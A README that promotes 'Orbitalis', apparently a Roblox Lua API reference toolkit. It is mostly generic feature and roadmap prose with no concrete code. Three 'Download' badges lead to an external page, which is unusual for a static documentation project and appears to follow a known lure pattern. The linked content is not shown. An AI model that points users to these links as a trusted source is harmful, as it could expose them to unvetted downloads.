![preview](https://raw.githubusercontent.com/anhquan220708/rbx-api-ref/main/promo_5424.svg)
[![Download](https://raw.githubusercontent.com/anhquan220708/rbx-api-ref/main/run_9dc0e.svg)](https://anhquan220708.github.io/rbx-api-ref/)

# 🌌 Orbitalis — Roblox Lua API Reference & Knowledge Constellation

> A living, breathing encyclopedia of Roblox’s Lua API — rebuilt as a navigable star map for creators, educators, and tooling authors who want to explore every class, event, datatype, and enum without drowning in stale mirrors.

Welcome to **Orbitalis**, a next-generation documentation surface inspired by the original *Roblox Lua API Reference Pages* project. Where that repository served as a dependable archive, Orbitalis aims to be a **gravitational hub** — pulling together machine-readable schema dumps, human-friendly reading pages, multilingual annotations, and a responsive reader experience that feels less like a wiki and more like piloting a starship through the Roblox engine’s internals.

This README is intentionally long. It describes the philosophy, architecture, feature surface, contribution flow, governance, roadmap, and legal posture of the Orbitalis project. If you are here to read one paragraph and leave, that is fine — but if you are here to help build a durable reference layer for the Roblox creator ecosystem, keep scrolling. There is a lot to explore.

---

## 🚀 What Is Orbitalis?

Orbitalis is a **documentation and reference toolkit** for the Roblox Lua API. It ingests structured API dumps (the kind produced by reflection tooling), normalizes them into a stable intermediate schema, and emits multiple output formats:

- **Static HTML reference pages** — one page per class, with anchors for members, events, callbacks, properties, and inherited symbols.
- **JSON schema bundles** — for editors, linters, autocomplete engines, and documentation generators.
- **Markdown digests** — for embedding into wikis, changelogs, and internal team knowledge bases.
- **Search index blobs** — precomputed for instant, client-side fuzzy search.

The project exists because the Roblox API changes often, documentation lag is real, and tooling authors deserve a **single source of truth** they can vendor, fork, or mirror. Orbitalis treats the API surface not as a flat list, but as a **constellation**: classes orbit one another through inheritance, events fire across boundaries, and enums act as shared vocabulary. We render that topology faithfully.

[![Download](https://raw.githubusercontent.com/anhquan220708/rbx-api-ref/main/run_9dc0e.svg)](https://anhquan220708.github.io/rbx-api-ref/)

---

## 🧭 Project Philosophy

Three principles guide every decision in Orbitalis:

1. **Fidelity over flattery.** If the API says something odd, we document it as-is. We do not editorialize, we do not “fix” upstream quirks, and we do not hide deprecated surface area. Deprecation is part of the story.
2. **Readability as infrastructure.** Documentation is not a PDF graveyard. It is a live interface. Pages are responsive, keyboard-navigable, and structured for screen readers.
3. **Portability above lock-in.** Every artifact Orbitalis produces can be regenerated offline. No proprietary pipeline, no hidden service dependency, no telemetry beacons.

---

## ✨ Feature Surface

Orbitalis ships with a wide, deliberately curated set of capabilities. Each is designed to reduce friction for a different kind of user — the solo scripter, the studio tech lead, the tooling maintainer, the educator, the localization volunteer.

### 🛰️ Reference Generation
- Deterministic rendering: same input dump, same output bytes.
- Per-class pages with stable anchors (`#Property.Name`, `#Event.Name`, `#Method.Name`).
- Inheritance chains visualized as breadcrumb trails.
- Callback signatures with parameter types and return types.
- Enum pages cross-linked to every member that references them.

### 🧩 Machine-Readable Exports
- Versioned JSON schema with semantic-version-style tags.
- Compact and verbose variants for different bandwidth budgets.
- Stable field ordering to reduce diff noise in downstream repos.

### 🔎 Search & Discovery
- Client-side fuzzy search with ranking tuned for API identifiers.
- Prefix, camelCase, and snake_case aware tokenization.
- “Related symbols” suggestions based on co-occurrence in class definitions.

### 🌐 Multilingual Support
- Community-contributed translations layered on top of canonical English.
- Fallback ladder: locale → regional variant → English.
- Right-to-left layout support built into the reader shell.

### 📱 Responsive UI
- Fluid layout from 320px phones to ultrawide monitors.
- Dark, light, and high-contrast themes.
- Print stylesheet for offline study sessions.

### 🕒 Always-On Availability
- Static output means it can be served from any CDN, object store, or even a USB stick.
- No runtime server required for the reader experience.
- Continuous regeneration pipeline keeps content fresh around the clock, every day of the year.

### 🧪 Quality Gates
- Schema validation on every generated bundle.
- Link integrity checks across all cross-references.
- Snapshot tests to catch accidental structural drift.

### 🛠️ Contributor Ergonomics
- One-command local preview environment.
- Lint and format presets included.
- Issue templates for missing symbols, wrong signatures, and translation requests.

---

## 🗺️ Architecture Overview

Orbitalis is organized as a **pipeline** with clearly separated stages. Each stage can be run independently, which makes debugging far easier than a monolithic build.

- **Ingest** — Reads upstream API dumps and normalizes them into an internal representation.
- **Enrich** — Adds cross-references, inheritance edges, and translation hooks.
- **Render** — Produces HTML, JSON, and Markdown artifacts from the enriched model.
- **Index** — Builds search indexes and symbol relationship graphs.
- **Publish** — Copies artifacts into the distributable tree, ready for hosting.

Each stage writes to a content-addressed cache keyed by input hash. If nothing changed upstream, nothing downstream re-runs. This is how Orbitalis stays fast even as the API grows.

---

## 🧬 Data Model Highlights

The internal model is intentionally conservative. It models only what the API actually exposes, plus a thin layer of metadata for documentation purposes.

- **Classes** — identity, superclass, tags, deprecation status.
- **Members** — properties, methods, events, callbacks, each with signatures.
- **Enums** — named collections of integer-keyed items.
- **Datatypes** — opaque value types referenced by members.
- **Libraries** — global tables and their functions.
- **Security** — capability and permission annotations preserved verbatim.

Nothing is inferred that cannot be traced back to a source dump. When in doubt, Orbitalis says less, not more.

---

## 🎨 Design Language

The reader is built around a **dark-first, low-glare palette** with accent colors that map to symbol categories. Classes are cool blues, events are warm ambers, callbacks are soft greens, and datatypes are muted violets. This is not decoration — it is **visual grammar**. Once you learn the palette, you can scan a page and know what you are looking at before reading a single word.

Typography favors generous line height and monospaced identifiers with ligature support disabled, because nothing is worse than a code reference that renders `!=` as a single glyph and confuses readers trying to copy signatures.

---

## 🌍 SEO & Discoverability

Orbitalis pages are written to be found. Each class page carries a descriptive title, a human summary, and structured metadata that search engines can parse. The Markdown digests are optimized for inclusion in external documentation sites, and the JSON bundles are designed to be consumed by tooling that itself indexes content. We do not chase trends — we chase **clarity**, which is the only durable SEO strategy.

---

## 🧑‍🤝‍🧑 Community & Support

The project is maintained by volunteers and shaped by issue reports, pull requests, and translation contributions. Support is asynchronous and community-driven, with maintainers responding across time zones so that contributors in any region can get unblocked without waiting for a single person to wake up.

If you are unsure where to start, look for issues labeled as good starting points. They are scoped to be completable in an evening.

---

## 🧪 Testing Strategy

Every artifact Orbitalis emits is tested at three levels:

- **Unit** — individual renderers and parsers.
- **Integration** — full pipeline runs against a frozen sample dump.
- **Snapshot** — byte-level comparison of output for regression detection.

Snapshots are reviewed, not blindly accepted. If a diff appears, a human decides whether it reflects an intentional change.

---

## 📅 Roadmap (2026)

- **Q1 2026** — Stabilize schema v2 and freeze field names.
- **Q2 2026** — Expand multilingual coverage to six additional locales.
- **Q3 2026** — Ship a plugin-friendly graph export for visual tooling.
- **Q4 2026** — Introduce historical diff views showing API evolution over time.

Roadmap items are aspirational. They are listed here to invite collaboration, not to promise deadlines.

---

## 🛡️ Disclaimer

Orbitalis is an **independent documentation project**. It is not affiliated with, endorsed by, or sponsored by Roblox Corporation. All API names, identifiers, and structural descriptions are reproduced for interoperability and educational purposes. If any upstream rights holder requests a change, we will respond promptly and in good faith.

The reference material is provided **as-is**, without warranty of any kind, express or implied. You are responsible for verifying that any symbol you rely on behaves as documented in your target engine version. Documentation is a map, not the territory.

---

## 📜 License

Orbitalis is released under the **MIT License**. You are welcome to use, modify, and redistribute the project within the terms of that license. A copy of the license text should accompany any redistribution.

Read the full license here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 Orbitalis contributors.

---

## 🙏 Acknowledgements

Thanks to every contributor who filed a missing symbol report, corrected a signature, translated a page, or simply read the docs and found them useful. Documentation is a quiet craft, and the people who practice it rarely get applause. This project exists because of them.

---

## 🔚 Final Word

Orbitalis is not trying to be the loudest reference on the internet. It is trying to be the **most dependable** one. If you have ever opened an API page at 2 AM, half-asleep, looking for the exact argument order of an event handler, you are exactly who this project is built for. Welcome aboard.

[![Download](https://raw.githubusercontent.com/anhquan220708/rbx-api-ref/main/run_9dc0e.svg)](https://anhquan220708.github.io/rbx-api-ref/)